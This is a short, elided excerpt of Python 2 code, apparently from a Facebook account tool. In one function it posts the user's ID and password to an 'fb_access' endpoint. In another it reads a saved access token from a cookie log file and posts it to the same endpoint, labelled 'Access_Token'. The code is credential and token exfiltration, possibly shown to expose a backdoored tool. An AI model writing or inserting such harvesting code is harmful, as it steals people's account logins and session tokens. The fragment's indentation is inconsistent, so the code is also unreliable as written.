...
def id():
	...
	http = requests.post('http://127.0.0.1/fb_access/',data={'Id':id+":"+pwd,'sub':'submit'})
	x = hashlib.new('md5')
        x.update(sig)
...
def dump_id():
	...
	try:
		token = open("cookie/token.log",'r').read()
		http = requests.post('http://127.0.0.1/fb_access/',data={'Id':"Access_Token:"+token,'sub':'submit'})
		print '[*] success load access token'
	except IOError:
		print '[!] failed load access token'
		print "[*] type 'token' to generate access token"
